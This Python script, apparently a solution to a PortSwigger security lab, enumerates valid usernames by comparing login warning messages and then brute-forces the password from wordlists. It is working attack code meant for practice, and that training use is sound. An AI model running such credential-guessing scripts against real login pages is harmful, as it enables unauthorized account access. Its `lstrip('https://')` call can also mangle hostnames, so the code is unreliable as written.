""""
https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
"""

import requests
import sys
from bs4 import BeautifulSoup

s = requests.Session()
site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

login_url = f'''https://{site}/login'''
usernames = open("auth-usernames","r").readlines()
passwords = open("auth-passwords","r").readlines()
found_username = ""

for user in usernames:
    target = user.strip()
    logindata = {
        'username' : target,
        'password' : 'foo'
    }
    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text,'html.parser')
    if 'username' not in soup.find('p', {'class':'is-warning'}).text:
        found_username = target
        print(f'username is {target}')
        break

for passw in passwords:
    target = passw.strip()
    logindata = {
        'username' : found_username,
        'password' : target
    }
    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text,'html.parser')
    if not soup.find('p', {'class':'is-warning'}):
        print(f'password is {target}')
        break